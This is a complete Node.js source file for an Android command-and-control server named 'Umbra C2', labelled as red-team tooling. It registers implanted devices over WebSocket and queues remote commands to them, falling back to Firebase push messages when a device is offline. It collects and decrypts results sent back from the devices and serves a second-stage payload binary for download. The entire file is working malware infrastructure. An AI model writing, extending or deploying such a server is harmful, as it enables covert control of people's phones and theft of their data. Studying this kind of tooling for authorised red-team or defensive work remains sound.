'use strict';

const fs = require('fs');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');
const { v4: uuidv4 } = require('uuid');
const express = require('express');
const { Server: SocketIOServer } = require('socket.io');

const cryptoModule = require('./crypto');
const fcm = require('./fcm');

// ─── Configuration ───────────────────────────────────────────────────────────

const PORT = process.env.PORT || 8443;
const CERT_DIR = path.join(__dirname, 'certs');
const KEY_PATH = path.join(CERT_DIR, 'server.key');
const CERT_PATH = path.join(CERT_DIR, 'server.crt');
const STAGE2_DIR = path.join(__dirname, 'stage2');
const STAGE2_FILE = path.join(STAGE2_DIR, 'stage2.bin');

// ─── Logging ─────────────────────────────────────────────────────────────────

function timestamp() {
  return new Date().toISOString();
}

function log(level, ...args) {
  const ts = `[${timestamp()}]`;
  switch (level) {
    case 'error':
      console.error(ts, '[ERROR]', ...args);
      break;
    case 'warn':
      console.warn(ts, '[WARN]', ...args);
      break;
    case 'info':
      console.log(ts, '[INFO]', ...args);
      break;
    case 'debug':
      console.log(ts, '[DEBUG]', ...args);
      break;
    default:
      console.log(ts, `[${level}]`, ...args);
  }
}

// ─── TLS Certificate Generation ──────────────────────────────────────────────

function ensureCerts() {
  if (fs.existsSync(KEY_PATH) && fs.existsSync(CERT_PATH)) {
    log('info', 'TLS certificates found.');
    return;
  }

  log('info', 'Generating self-signed TLS certificates...');
  fs.mkdirSync(CERT_DIR, { recursive: true });

  try {
    execSync(
      `openssl req -x509 -newkey rsa:4096 -keyout "${KEY_PATH}" -out "${CERT_PATH}" ` +
      `-days 3650 -nodes -subj "/CN=Umbra-C2-Server/O=Umbra/OU=RedTeam"`,
      { stdio: 'pipe', timeout: 30000 }
    );
    fs.chmodSync(KEY_PATH, 0o600);
    log('info', 'Self-signed TLS certificates generated.');
  } catch (err) {
    log('error', 'Failed to generate self-signed certificates:', err.message);
    log('error', 'Make sure openssl is installed and available in PATH.');
    process.exit(1);
  }
}

// ─── Device Registry ─────────────────────────────────────────────────────────

/**
 * Device registry structure:
 * {
 *   [device_id]: {
 *     socketId: string,       // active Socket.IO socket ID
 *     fcmToken: string,       // FCM registration token
 *     lastSeen: ISO timestamp,
 *     info: {                 // device metadata reported on connect
 *       device_id: string,
 *       model: string,
 *       android_version: string,
 *       ...
 *     }
 *   }
 * }
 */
const devices = {};

// Command queue per device
const commandQueues = {}; // { device_id: [command, ...] }

function getDevice(deviceId) {
  return devices[deviceId] || null;
}

function registerDevice(deviceId, socketId, info) {
  const existing = devices[deviceId];

  devices[deviceId] = {
    socketId,
    fcmToken: existing ? existing.fcmToken : null,
    lastSeen: new Date().toISOString(),
    info: info || { device_id: deviceId },
  };

  // Initialize command queue if not present
  if (!commandQueues[deviceId]) {
    commandQueues[deviceId] = [];
  }

  log('info', `Device registered: ${deviceId} (socket: ${socketId})`);
  return devices[deviceId];
}

function updateFcmToken(deviceId, fcmToken) {
  if (devices[deviceId]) {
    devices[deviceId].fcmToken = fcmToken;
    devices[deviceId].lastSeen = new Date().toISOString();
    log('info', `FCM token updated for ${deviceId}`);
  } else {
    devices[deviceId] = {
      socketId: null,
      fcmToken,
      lastSeen: new Date().toISOString(),
      info: { device_id: deviceId },
    };
    commandQueues[deviceId] = [];
    log('info', `Device created via FCM registration: ${deviceId}`);
  }
}

function disconnectDevice(deviceId) {
  if (devices[deviceId]) {
    devices[deviceId].socketId = null;
    devices[deviceId].lastSeen = new Date().toISOString();
    log('info', `Device disconnected: ${deviceId}`);
  }
}

function removeDevice(deviceId) {
  delete devices[deviceId];
  delete commandQueues[deviceId];
  log('info', `Device removed: ${deviceId}`);
}

function getDeviceBySocketId(socketId) {
  for (const deviceId of Object.keys(devices)) {
    if (devices[deviceId].socketId === socketId) {
      return { deviceId, entry: devices[deviceId] };
    }
  }
  return null;
}

function getAllDevices() {
  return Object.entries(devices).map(([deviceId, entry]) => ({
    device_id: deviceId,
    socketId: entry.socketId,
    fcmToken: entry.fcmToken ? '***' : null,
    fcmConfigured: !!entry.fcmToken,
    lastSeen: entry.lastSeen,
    online: entry.socketId !== null,
    info: entry.info,
  }));
}

function isDeviceOnline(deviceId) {
  return !!(devices[deviceId] && devices[deviceId].socketId);
}

// ─── Command Handling ────────────────────────────────────────────────────────

function buildCommand(module, action, params) {
  return {
    id: uuidv4(),
    module,
    action,
    params: params || {},
    timestamp: new Date().toISOString(),
  };
}

async function queueCommand(deviceId, module, action, params) {
  const command = buildCommand(module, action, params);

  // Initialize queue if needed
  if (!commandQueues[deviceId]) {
    commandQueues[deviceId] = [];
  }

  // Check if device is online via WebSocket
  if (isDeviceOnline(deviceId)) {
    log('info', `Pushing command "${module}.${action}" to ${deviceId} via WebSocket`);
    // We'll push it via Socket.IO — queue it and flush
    commandQueues[deviceId].push(command);
    return command;
  }

  // Device is offline — try FCM
  if (fcm.isConfigured() && devices[deviceId] && devices[deviceId].fcmToken) {
    log('info', `Pushing command "${module}.${action}" to ${deviceId} via FCM`);
    const sent = await fcm.sendToToken(devices[deviceId].fcmToken, command);
    if (sent) {
      return command;
    }
    log('warn', `FCM failed for ${deviceId}, queueing command for later delivery`);
  } else {
    log('warn', `Device ${deviceId} offline and FCM not available, queueing command`);
  }

  // Queue for later delivery
  commandQueues[deviceId].push(command);
  return command;
}

/**
 * Flush queued commands to a device that just came online via WebSocket.
 * Called after device registers via Socket.IO.
 */
function flushCommandQueue(deviceId, socket) {
  const queue = commandQueues[deviceId];
  if (!queue || queue.length === 0) return;

  log('info', `Flushing ${queue.length} queued commands to ${deviceId}`);
  while (queue.length > 0) {
    const command = queue.shift();
    socket.emit('command', command);
  }
}

// ─── Express & Socket.IO Setup ───────────────────────────────────────────────

function createServer() {
  ensureCerts();

  const app = express();

  // CORS middleware
  app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') {
      return res.sendStatus(204);
    }
    next();
  });

  // JSON body parsing
  app.use(express.json({ limit: '5mb' }));

  // Request logging
  app.use((req, res, next) => {
    log('info', `${req.method} ${req.url} from ${req.ip}`);
    next();
  });

  // ─── REST Endpoints ──────────────────────────────────────────────────────

  // POST /api/register-fcm
  app.post('/api/register-fcm', (req, res) => {
    const { device_id, fcm_token } = req.body;

    if (!device_id) {
      return res.status(400).json({ error: 'device_id is required' });
    }
    if (!fcm_token) {
      return res.status(400).json({ error: 'fcm_token is required' });
    }

    updateFcmToken(device_id, fcm_token);

    res.json({
      status: 'ok',
      message: `FCM token registered for ${device_id}`,
    });
  });

  // POST /api/command
  app.post('/api/command', async (req, res) => {
    const { device_id, module, action, params } = req.body;

    if (!device_id) {
      return res.status(400).json({ error: 'device_id is required' });
    }
    if (!module) {
      return res.status(400).json({ error: 'module is required' });
    }
    if (!action) {
      return res.status(400).json({ error: 'action is required' });
    }

    const command = await queueCommand(device_id, module, action, params || {});

    res.json({
      status: 'ok',
      command_id: command.id,
      delivery: isDeviceOnline(device_id) ? 'websocket' : (fcm.isConfigured() ? 'fcm' : 'queued'),
      message: `Command "${module}.${action}" queued for ${device_id}`,
    });
  });

  // POST /api/result
  app.post('/api/result', (req, res) => {
    const { device_id, data } = req.body;

    if (!device_id || !data) {
      return res.status(400).json({ error: 'device_id and data are required' });
    }

    // Try to decrypt if it looks like base64
    let result;
    try {
      result = cryptoModule.decrypt(data);
      log('info', `=== Result from ${device_id} (decrypted) ===`);
      log('info', result);
      log('info', '=== End result ===');
    } catch {
      // Not encrypted or wrong format — log raw
      result = data;
      log('info', `=== Result from ${device_id} (raw) ===`);
      log('info', JSON.stringify(data));
      log('info', '=== End result ===');
    }

    res.json({
      status: 'ok',
      message: 'Result received',
    });
  });

  // GET /api/devices
  app.get('/api/devices', (req, res) => {
    res.json({
      count: Object.keys(devices).length,
      devices: getAllDevices(),
    });
  });

  // GET /api/stage2
  app.get('/api/stage2', (req, res) => {
    if (!fs.existsSync(STAGE2_FILE)) {
      log('warn', 'Stage 2 payload requested but stage2.bin not found');
      return res.status(404).json({ error: 'Stage 2 payload not available' });
    }

    const payload = fs.readFileSync(STAGE2_FILE);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="stage2.bin"');
    res.send(payload);

    const { device_id } = req.query;
    if (device_id) {
      log('info', `Stage 2 payload served to ${device_id} (${payload.length} bytes)`);
    } else {
      log('info', `Stage 2 payload served (${payload.length} bytes)`);
    }
  });

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({
      status: 'ok',
      uptime: process.uptime(),
      devices: Object.keys(devices).length,
      fcm: fcm.isConfigured(),
    });
  });

  // ─── HTTPS Server ────────────────────────────────────────────────────────

  const sslOptions = {
    key: fs.readFileSync(KEY_PATH),
    cert: fs.readFileSync(CERT_PATH),
  };

  const server = https.createServer(sslOptions, app);

  // ─── Socket.IO ───────────────────────────────────────────────────────────

  const io = new SocketIOServer(server, {
    path: '/c2',
    cors: {
      origin: '*',
      methods: ['GET', 'POST'],
    },
    pingTimeout: 60000,
    pingInterval: 25000,
    connectTimeout: 30000,
    transports: ['websocket'], // WebSocket only for Android compatibility
  });

  // ─── Socket.IO Event Handlers ────────────────────────────────────────────

  io.on('connection', (socket) => {
    log('info', `Socket connected: ${socket.id} from ${socket.handshake.address}`);

    // Device registration via WebSocket
    socket.on('register', (data) => {
      if (!data || !data.device_id) {
        log('warn', `Register attempt from ${socket.id} without device_id`);
        socket.emit('error', { message: 'device_id is required' });
        return;
      }

      const { device_id, ...info } = data;

      // If there's an existing socket for this device, disconnect it
      if (devices[device_id] && devices[device_id].socketId && devices[device_id].socketId !== socket.id) {
        const oldSocket = io.sockets.sockets.get(devices[device_id].socketId);
        if (oldSocket) {
          log('info', `Disconnecting stale socket for ${device_id}: ${devices[device_id].socketId}`);
          oldSocket.disconnect(true);
        }
      }

      registerDevice(device_id, socket.id, info);

      socket.emit('registered', {
        status: 'ok',
        message: 'Device registered successfully',
        device_id,
      });

      // Flush any queued commands
      flushCommandQueue(device_id, socket);
    });

    // Heartbeat from device
    socket.on('heartbeat', (data) => {
      const dev = getDeviceBySocketId(socket.id);
      if (dev) {
        devices[dev.deviceId].lastSeen = new Date().toISOString();
      }
    });

    // Encrypted result from device
    socket.on('result', (data) => {
      const dev = getDeviceBySocketId(socket.id);
      const deviceId = dev ? dev.deviceId : 'unknown';

      try {
        const decrypted = cryptoModule.decrypt(data.payload || data);
        log('info', `=== Result from ${deviceId} (WS, decrypted) ===`);
        log('info', decrypted);
        log('info', '=== End result ===');
      } catch {
        log('info', `=== Result from ${deviceId} (WS, raw) ===`);
        log('info', JSON.stringify(data));
        log('info', '=== End result ===');
      }
    });

    // Device info update
    socket.on('info', (data) => {
      const dev = getDeviceBySocketId(socket.id);
      if (dev && data) {
        devices[dev.deviceId].info = { ...devices[dev.deviceId].info, ...data };
        devices[dev.deviceId].lastSeen = new Date().toISOString();
        log('info', `Device info updated for ${dev.deviceId}`);
      }
    });

    // Disconnect cleanup
    socket.on('disconnect', (reason) => {
      const dev = getDeviceBySocketId(socket.id);
      if (dev) {
        disconnectDevice(dev.deviceId);
        log('info', `Socket ${socket.id} disconnected (${reason}) — device: ${dev.deviceId}`);
      } else {
        log('info', `Socket ${socket.id} disconnected (${reason})`);
      }
    });
  });

  // ─── Graceful Shutdown ───────────────────────────────────────────────────

  async function shutdown(signal) {
    log('info', `Received ${signal}. Shutting down gracefully...`);

    // Notify all connected devices
    for (const socketId of Object.keys(io.sockets.sockets)) {
      const socket = io.sockets.sockets.get(socketId);
      if (socket) {
        socket.emit('server_shutdown', { message: 'Server is shutting down' });
      }
    }

    // Close Socket.IO
    io.close(() => {
      log('info', 'Socket.IO closed.');
    });

    // Close HTTPS server
    server.close(() => {
      log('info', 'HTTPS server closed.');
      process.exit(0);
    });

    // Force exit after 10 seconds
    setTimeout(() => {
      log('error', 'Forced shutdown after timeout.');
      process.exit(1);
    }, 10000);
  }

  process.on('SIGINT', () => shutdown('SIGINT'));
  process.on('SIGTERM', () => shutdown('SIGTERM'));

  // ─── Start ───────────────────────────────────────────────────────────────

  server.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║              ☂  UMBRA C2 SERVER  ☂                   ║');
    console.log('╠════════════════════════════════════════════════════════╣');
    console.log(`║  Listening  : https://0.0.0.0:${PORT}                      ║`);
    console.log(`║  WebSocket  : wss://0.0.0.0:${PORT}/c2                    ║`);
    console.log(`║  FCM        : ${fcm.isConfigured() ? 'CONFIGURED ✅' : 'DISABLED ⚠️'}                             ║`);
    console.log(`║  Stage 2    : ${fs.existsSync(STAGE2_FILE) ? 'READY ✅' : 'MISSING ⚠️'}                             ║`);
    console.log(`║  Devices    : ${Object.keys(devices).length} online                                      ║`);
    console.log('╚════════════════════════════════════════════════════════╝');
    console.log('');
  });

  return { app, server, io };
}

// ─── Entry Point ────────────────────────────────────────────────────────────

log('info', 'Umbra C2 Server starting...');

// Initialize FCM (non-blocking; works even without key file)
fcm.init();

// Create and start server
createServer();
